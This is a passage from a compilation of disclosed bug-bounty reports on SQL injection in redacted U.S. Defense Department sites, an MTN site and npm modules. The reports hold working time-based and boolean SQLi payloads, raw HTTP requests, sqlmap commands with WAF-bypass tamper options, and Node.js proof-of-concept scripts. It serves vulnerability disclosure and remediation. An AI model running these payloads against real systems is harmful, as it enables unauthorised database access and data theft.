- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

> Hunter's comments and funny memes go here

https://imgflip.com/i/40r9dg

## Impact

An attacker can achieve denials of service attacks and/or alter the application logic to cause SQL injections by only depending on the library code. If any useful gadget to trigger an arbitrary code/command execution is also available in the end-user application and the path can be reached with user interaction, the attacker can also achieve arbitrary command execution on the target system.

---

### [SQL Injection in the `move_papers.php` on the https://██████████](https://hackerone.com/reports/491191)

- **Report ID:** `491191`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2020-06-25T13:07:27.469Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. I was able to find another one Time-based SQLI on the `https://██████████/pubs/move_papers.php` using `pub_group_id` parameter.

This is my third SQLi (and probably the last one) found on this host. I wasn't able to detect more, but due to the big number of high impact issues found I also recommend to do internal audit of this host to determine other potential issues I could skip. I have feeling that more endpoints can be affected by the sql injection, I just didn't find them all. I'll continue my research and will report other vulnerabilities if I find any.

For the start, by bruteforcing files in the /pubs/ directory, I came across this script:
https://████████/pubs/move_papers.php
██████████
I was able to determine the parameter `pub_group_id` (similar sqli through this parameter was found and reported earlier in other script - `get_publications.php` in #489483 )

##POC
```
GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1
Host: █████████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: ███████


```
This request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.
As additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:
```
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```
where test.txt is a text file contained request dump:
████
Result:
```
5.5.62-0ubuntu0.14.04.1
```
█████
No sensitive data such as databases, tables, or content was accessed.

## Impact

SQL injection usually have high or critical impact.

---

### [[CRITICAL] Sql Injection on http://axa.dxi.eu](https://hackerone.com/reports/722145)

- **Report ID:** `722145`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** 8x8
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2020-06-09T21:04:57.374Z
- **CVE(s):** -

**Summary (team):**

One of the micro service endpoints of the ContactNow application constructed a SQL query utilizing user provided parameters without utilizing a proper prepared statement.

---

### [Followup - SQL Injection - https://██████████/██████/MSI.portal](https://hackerone.com/reports/692326)

- **Report ID:** `692326`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @arkaic
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:07:19.205Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Time based blind sql injection for parameter MSI_additionalFilterType1, at the following URL:

https://███/███/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61

**Description:**

This is a follow up to a previous report I submitted:

https://hackerone.com/reports/674838


The following page has a form parameter which is vulnerable to time based blind sql injection, which allows an attacker to retrieve information from the database.

https://█████████/███/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61

The page uses several hidden parameters which are sent when the form is submitted. The specific vulnerable parameter in this case is "MSI_additionalFilterType1".

Sample form POST data, prior to SQL injection testing:

https://█████████/█████/msi/query_results.jsp?MSI_additionalFilterType1=-999&MSI_additionalFilterType2=-999&MSI_additionalFilterValue1=-999&MSI_additionalFilterValue2=-999&MSI_generalFilterType=-999&MSI_generalFilterValue=-999&MSI_outputOptionType1=-999&MSI_outputOptionType2=-999&MSI_outputOptionValue1=-999&MSI_outputOptionValue2=-999&MSI_queryType=-999


Initially I was not able to retrieve details about the database user nor the schema. After adjusting several parameters for sqlmap, I was able to successfully do so.

Here we can see the specific edition of Oracle DB used, along with the user and database name:

████

```
banner: 'Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production'
[13:11:58] [INFO] fetching current user
[13:11:58] [INFO] retrieved: ███
current user: '██████████'
[13:13:17] [INFO] testing if current user is DBA
current user is DBA: True
[13:13:25] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes
[13:13:25] [INFO] fetching database (schema) names
[13:13:25] [INFO] fetching number of databases
[13:13:25] [INFO] retrieved: 
[13:13:29] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[13:13:29] [ERROR] unable to retrieve the number of databases
[13:13:29] [INFO] falling back to current database
[13:13:29] [INFO] fetching current database
[13:13:29] [INFO] retrieved: ███
[13:14:48] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
available databases [1]:
[*] ██████████
```
Here you can see the retrieval of a few table names from the database:

█████

```
[13:18:06] [INFO] fetching tables for database: '█████'
[13:18:06] [INFO] fetching number of tables for database '████'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] 
[13:18:08] [INFO] retrieved: 
[13:18:14] [INFO] adjusting time delay to 3 seconds due to good response times
67
[13:18:32] [INFO] retrieved: ████████
[13:19:54] [INFO] retrieved: ███████
[13:23:29] [INFO] retrieved: ██████████
[13:25:45] [INFO] retrieved: ████████
[13:28:37] [INFO] retrieved: ██████████
```
I interrupted the process at this point, so as to not enumerate all 67 table names, and ceased further testing.


## Impact

High

## Step-by-step Reproduction Instructions

1. Visit the vulnerable url (https://███/██████/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61) while using an intercepting proxy
2. Intercept GET request to capture full URL and all form parameters
3. Utilize sqlmap to detect and exploit sql injection in "MSI_additionalFilterType1" parameter

Note: The default configuration of sqlmap will not be able to find the sql injection. I adjusted the following parameters in order to do so.  "--risk 2 --level 3" and "--tamper=space2comment,randomcase,between"



## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions

1. Sanitize all form parameter inputs, and use whitelisting to allow only needed data
2. Rate limit submissions of forms. Time based sql injection requires many more HTTP requests than would be seen from legitimate browser activity.

## Impact

High/Critical impact.

This sql injection attack could be used to retrieve all information from the database. Also, the account is running with DBA privileges which would allow for the retrieval of database account passwords and takeover of the server itself via injection of system commands; these could be leveraged to attack other systems on the network and potential lateral movement to other systems.

---

### [SQL Injection in Login Page: https://█████/█████████/login.php](https://hackerone.com/reports/447742)

- **Report ID:** `447742`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @l00ph0le
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T16:48:11.416Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I believe I've discovered an error based SQL injection in the login page for https://████/██████/login.php.

**Description:**
When browsing to the webpage https://█████/██████/login.php and entering certain control characters into the "Username" field, and SQL error (Oracle) is produced.

## Impact
This is hard to gauge as I did not attempt to fully exploit the SQL injection point. Once I identified that it was an error-based SQL injection, I stopped. The website also has a Web Application Firewall and IPS implemented, so bypasses would need to be used to fully exploit it. I didn't know the rules for this program in regard to bypasses defenses with automated tools like sqlmap the --tamper parameter. 

## Step-by-step Reproduction Instructions

1. Browse to https://█████████/███/login.php
2. Enter " '; --  " into the username field
3. The error "ORA-00933: SQL command not properly ended" is produced

## Product, Version, and Configuration (If applicable)
██████████ █████████ Portal
Version: 3.0.89
Last Modified: Oct 04, 2018 

## Suggested Mitigation/Remediation Actions
Parameterized queries should be used to separate the command and data portions of the intended query to the database. These queries prevent an attacker from tampering with the query logic and extending a concatenated database query string. Code reviews should be conducted to identify any additional areas were the application or other applications in the organization are vulnerable to this attack.
Additionally, input validation should be enforced on the server side in order to ensure that only expected data is sent in queries. Where possible security specific libraries should be used in order to provide an additional layer of protection.

## Impact

A skilled attacker could likely gain access to the database for the website, and depending on the privileges of the database user, gain access to other databases or compromise the system hosting the database engine.

---

### [ SQL Injection on cookie parameter](https://hackerone.com/reports/761304)

- **Report ID:** `761304`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** MTN Group
- **Reporter:** @w31rd0
- **Bounty:** - usd
- **Disclosed:** 2020-05-03T08:58:13.945Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang parameter in cookies. If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed.
I did not attempt to exfiltrate data as this is obvious indication of SQLi.

```
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
```

I would like to ask for permission for further exploiting this issue.

## Impact

Web application is vulnerable to SQL injection, allowing access to data

---

### [[increments] sql injection](https://hackerone.com/reports/508346)

- **Report ID:** `508346`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @verichains
- **Bounty:** - usd
- **Disclosed:** 2020-02-02T23:02:09.387Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report `SQL Injection` in `increments`.
It allows creating fake polls.

# Module

**module name:** `increments`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/increments`

## Module Description

> Increment is a **database-driven** for creating  **polls** and taking **votes** for various options, candidates, or parties. Using MongoJS collections as a storage framework, Increments offers in-depth statistical data on generated polls.

## Module Stats

[45] downloads in the last week

# Vulnerability

## Vulnerability Description

This module does not escape voting data allowing attacker to create fake votes.

## Steps To Reproduce:

- `npm install increments`
- run poc:

```javascript
const increments = require('increments');
increments.setup('mysql://root:@localhost:3306/test');
increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
increments.statistics('fruits', function(e, f) {
	console.log( f.projectedWinner );
	process.exit(0);
});
```

Output:
```
{ name: 'Oranges',
  id: 'oranges',
  color: undefined,
  count: 11,
  percentage: 100 }
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOS
- 8.12.0
- 6.4.1

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

SQL Injection.

---

### [[@azhou/basemodel] SQL injection](https://hackerone.com/reports/506644)

- **Report ID:** `506644`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @verichains
- **Bounty:** - usd
- **Disclosed:** 2020-02-02T23:00:07.219Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report SQL injection in @azhou/basemodel
It allows attacker to read data from database.

# Module

**module name:** @azhou/basemodel
**version:** 1.0.0
**npm page:** `https://www.npmjs.com/package/@azhou/basemodel`

## Module Description

### Usage

#### Initialization

```js
var model = require("@azhou/basemodel")(tableName, fields);
```
where `tableName` is the name of the data table and `fields` refers to the field list, either using comma connected string or array.

Example:
```js
// Initialize database
var db = require("@azhou/mysql-wrapper");
db.init("server", "database", "username", "password");

// Create basic CRUD data model
var model = require("@azhou/basemodel")("table", [ "field1", "field2", "field3", ... ]);
```

Notice when defining fields, `id` should not implicitly added and should not be contained in the field list

If validation is required, function `validate()` that returns boolean can be added to `model`:
```js
model.validate = function (source) { ... }
```

#### CRUD Functions

##### Create Object

```js
model.create(source)
```
* `source` is the source object

Example:
```js
model.create({ name: 'John Doe', value: 123.456 }).then(function (id) { ... });
```

##### Read Object by ID

```js
model.getById(id, fields)
```
* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.

Examples:
```js
model.getById(123).then(function (obj) { ... });
model.getById(456, [ "name", "value" ]).then(function (obj) { ... });
```

##### Read Object by Name

```js
model.getByName(name, fields)
```
* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.

##### Read All Objects

```js
model.getAll(fields, orderby)
```
* `fields` is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.

* `orderby` is an optional string argument which defines the ordering of the returned list.

Examples:
```js
model.getAll("name").then(function (list) { ... });
model.getAll([ "name", "value" ]).then(function (list) { ... });
model.getAll([ "name", "value" ], "name DESC").then(function (list) { ... });
```

##### Read Objects by ID list

There are four different of formats:

1. Read all objects whose `id` is in the `ids` list:

	```js
	model.getAllByIds(ids)
	```

2. Read all objects whose `id` is in the `ids` list, and returns the fields listed in `fields` array
	
	```js
	model.getAllByIds(ids, fields)
	```
3. Object array is provided, and the `id` is retrieved from field `nameOfIdField`

	```js
	model.getAllByIds(objects, nameOfIdField)
	```
4. Object array is provided, and the `id` is retrieved from field `nameOfIdField`. Field array is also provided

	```js
	model.getAllByIds(objects, nameOfIdField, fields)
	```

Examples:
```js
model.getAllByIds([ 1, 2, 3 ]).then(function (list) { ... });
model.getAllByIds([ 1, 2, 3 ], [ "name", "value" ]).then(function (list) { ... });
model.getAllByIds(objects, "id").then(function (list) { ... });
model.getAllByIds(objects, "id", [ "name", "value" ]).then(function (list) { ... });
```

##### Update Object
```js
model.update(id, source)
```
Example:
```js
model.update(123, { name: "Mike Smith" }).then(function () { ... });
```

##### Delete Object
```js
model.delete(id)
```

## Module Stats

8 downloads in the last month

# Vulnerability

## Vulnerability Description

- All table names and fields arguments of all methods are fed directly into query by string concatenation without escaping which may lead to sql injection.
- Order by field of `model.getAll(fields, orderby)` is not escaped and directly used in query which lead to blind sql injection:
```js
	model.getAll = function (fields, orderby) {
		if (typeof fields == 'string') {
			orderby = fields;
			fields = allFields;
		} else if (Array.isArray(fields) && (typeof orderby == 'string' || !orderby)) {
			if (fields.length == 0)
				fields = allFields;
		} else {
			fields = allFields;
			orderby = "";
		}

		return db.query("SELECT id," + fields.join(",") + " FROM `" + table + "`"
			+ (orderby ? " ORDER BY " + orderby : ""));
	}
```

## Steps To Reproduce:

Example POC:
```
var db = require("@azhou/mysql-wrapper");
db.init("localhost", "mysql", "root", "");

(async () => {
	await db.query("CREATE TABLE IF NOT EXISTS test(id int not null PRIMARY KEY AUTO_INCREMENT, ckey varchar(255), cvalue varchar(255));");
	await db.query("TRUNCATE TABLE test;");

	var model = require("@azhou/basemodel")("test", ["ckey","cvalue"]);
	
	for(var i=0;i<10;i++)
		await model.create({ckey: `k${i}`, cvalue: `v${i}`});
	
	console.log('- get all (normal)');
	console.log(await model.getAll(["ckey", "cvalue"]))

	console.log('- get all (sqli)');
	console.log(await model.getAll(["ckey", "cvalue from test where 1=0 union all select 0, 'sqli','sqli'#"]))

	console.log('- get all (bsqli in order by)');
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=1, id, -id) LIMIT 1'))
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=0, id, -id) LIMIT 1'))
})()
```

Output
```
- get all (normal)
[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' },
  RowDataPacket { id: 2, ckey: 'k1', cvalue: 'v1' },
  RowDataPacket { id: 3, ckey: 'k2', cvalue: 'v2' },
  RowDataPacket { id: 4, ckey: 'k3', cvalue: 'v3' },
  RowDataPacket { id: 5, ckey: 'k4', cvalue: 'v4' },
  RowDataPacket { id: 6, ckey: 'k5', cvalue: 'v5' },
  RowDataPacket { id: 7, ckey: 'k6', cvalue: 'v6' },
  RowDataPacket { id: 8, ckey: 'k7', cvalue: 'v7' },
  RowDataPacket { id: 9, ckey: 'k8', cvalue: 'v8' },
  RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]
- get all (sqli)
[ RowDataPacket { id: 0, ckey: 'sqli', cvalue: 'sqli' } ]
- get all (bsqli in order by)
[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' } ]
[ RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOS
- 8.12.0
- 6.4.1

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Allow attackers to query database if they have access to orderBy variable and to perform any query type if have access to table or column variable.

---

### [MSSQL injection via param Customwho in https://█████/News/Transcripts/Search/Sort/ and WAF bypass](https://hackerone.com/reports/577612)

- **Report ID:** `577612`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @bohdansec
- **Bounty:** - usd
- **Disclosed:** 2019-10-10T19:13:15.046Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

MSSQL injection via param `Customwho` in https://███████/News/Transcripts/Search/Sort/

**Description:**

MSSQL injection via param `Customwho` in https://██████████/News/Transcripts/Search/Sort/

There is WAF, but we can make bypass and via global variable `@@LANGID` we can know that the base is used here - MSSQL

## Impact

Critical

## Step-by-step Reproduction Instructions

Via global variable `@@LANGID` we can find out that here is MSSQL database. ████

https://█████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@LANGID

And if use a non-existing global variable, then we get an error. ██████

https://██████████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@nonexisting

## Suggested Mitigation/Remediation Actions

Using prepared statement

## Impact

We can read and do other manipulations in the database. We can also try to make RCE

---

### [SQL injection on █████ due to tech.cfm ](https://hackerone.com/reports/310031)

- **Report ID:** `310031`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:57:25.963Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The website appears to be vulnerable to SQL injection due to inducing an sql error using a single '
**Description:**
The following url, https://█████/hro/html/tech.cfm?Sort=Grade&ThisType=2 contains the parameter sort= which is vulnerable to SQLI. We know this due to the error disclosing the SQL query being used. 
```SELECT *, tbl_JobInfo.id as TJobID,tbl_JobDocs.id as DocID FROM dbo.tbl_JobInfo left outer join dbo.tbl_JobType on JobTypeID = tbl_JobType.id left outer join tbl_JobDocs on tbl_JobInfo.id = tbl_JobDocs.JobID WHERE JobTypeID = 3 AND JobTypeID > 1 AND Display = 'Y' Order by 'INJECTION' ASC1```  We can then demonstrate vulnerability by using time based queries and I opted to instead keep my queries low impact as to not violate the rules.
## Impact
High
## Step-by-step Reproduction Instructions

https://███/hro/html/tech.cfm?Sort=SLEEP(25)&ThisType=3
This will cause the page hang to hang momentarily 
This won't cause the website to hang, https://█████████/hro/html/tech.cfm?Sort=SLEEP()&ThisType=3
Additionally included timing screen shots showing the time  between the pages
## Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Sanitize user input and prepare statements

## Impact

An attacker could access the Database and harvest potentially sensitive data from the website or even take over the entire website through using certain SQL commands.

**Summary (researcher):**

The website had an end point like website.mil/xxx/xxx.cfm?sort=grade&type=2.  I probed using an apostrophe which resulted in an error. I proceeded to exploit by using a time based query as a proof of concept.

---

### [Blind SQL injection on ████████](https://hackerone.com/reports/313037)

- **Report ID:** `313037`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:56:43.642Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
 I discovered that a post request made to https://████████/elist/viewem6.php is vulnerable to SQL injection and is quite clearly vulnerable as I was able to induce a 2 second hang on the web page. Additionally I was able to discover the mysql version with a true/false condition.
**Description:**
 A post request is made to hhttps://████████/elist/viewem6.php  with the following parameters, 
rememail=test@att.net
As to not break the rules of engagement, I used a sleep query and Boolean based commands to clearly and definitively demonstrate the vulnerability and the severity of it.
## Impact
Critical
## Step-by-step Reproduction Instructions
In burp suite we can set a repeater request as followed. Target set as https://████/
POST /elist/viewem6.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://███████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2b(select*from(select(sleep(2)))a)%2b'

Observe a 2 second hang.
vs 

POST /elist/viewem6.php HTTP/1.1
Host: ███
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2b(select*from(select(sleep(0)))a)%2b'

Additionally we can detect version of the mysql by using the following request

POST /elist/viewem6.php HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://██████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'



vs 


POST /elist/viewem6.php HTTP/1.1
Host: ████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████/elist/email_escribe.php?type=R
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Cookie: v1st=A9532F64A9E711AF; PHPSESSID=1796d85a30d3addf5934c1f0fafec529
Connection: close
Upgrade-Insecure-Requests: 1

rememail=test@att.net'%2bIF(MID(@@version,1,1)=5sleep(2),1)=2%2b'

We can then discover the version of the DB, we can use queries like this to further discover data.To specify these two queries will demonstrate a true or false query. True scenario will result in the Database sleeping for 2 seconds, false it won't sleep, using this logic, I was able to evaluate if the website's Mysql version started with 4 or 5. As I said above it was possible to escalate from simple time queries to reading data and executing other commands by combing sleep queries with true/false statements.

## Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Sanitize user input and use stored procedures

## Impact

An attacker would be able to read data and steal data in the Database on this website leading to PII leakage and additionally may lead to the website being compromised completely

**Summary (researcher):**

During my previous SQL injection on a similar domain, I discovered another sub-domain that had the same exact vulnerable end point. I was able to exploit it in a similar fashion as the previous website and discovered it shared the same DB as the previous sub domain.

---

### [Code reversion allowing SQLI again in ███████](https://hackerone.com/reports/348047)

- **Report ID:** `348047`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:49:20.686Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I just noticed that my publicly disclosed report, https://hackerone.com/reports/311922 is sstill vulnerable either a code reversion was made or something was done to revert the patch. Additionally I'd please request that the images in the report to be censored or redacted as it's been made vulnerable again.
**Description:**
A code reversion made a previously patched sql injection vulnerable, allowing attackers to once again attack and access the back end DB. 
## Impact
High
## Step-by-step Reproduction Instructions

POST /elist/email_aba.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1

lname=S&userid=admin'%2b(select*from(select(sleep(3)))a)%2b'&pw=admin

vs 

POST /elist/email_aba.php HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://████████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1

lname=S&userid=admin'%2b(select*from(select(sleep(0)))a)%2b'&pw=admin

## Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Take down subdomain if not needed any more

## Impact

Access database information, steal sensitive PII or information

The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Verified**
Yes

**What exploitation technique did you utilize?**
Time delay

**Please describe the results of your verification attempt.**
Observed time delays when using sleep comands

---

### [sql injection on  /messagecenter/messagingcenter at https://www.███████/](https://hackerone.com/reports/381758)

- **Report ID:** `381758`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @modam3r5
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:47:55.877Z
- **CVE(s):** -

**Vulnerability Information:**

Hi , 
i would like to report an issues that lead to SQL injection in search box at https://www.████/messagecenter/messagingcenter , if you add the character `'` that usually used to test if the site have in `sql injection `  the site will return with  `Incorrect syntax` error that can confirm the site is effected with this bug .

#POC 
open the following link and enter `'` in the box will see this error in response https://www.█████████/messagecenter/messagingcenter 

```
Server Error in '/' Application.
Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.

Source Error:

An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.

Stack Trace:


[SqlException (0x80131904): Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +1787822
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5341894
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +546
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +1693
   System.Data.SqlClient.SqlDataReader.TryConsumeMetaData() +61
   System.Data.SqlClient.SqlDataReader.get_MetaData() +90
   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +377
   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, SqlDataReader ds) +1421
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean asyncWrite) +177
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +53
   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +137
   System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) +41
   System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) +10
   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +140
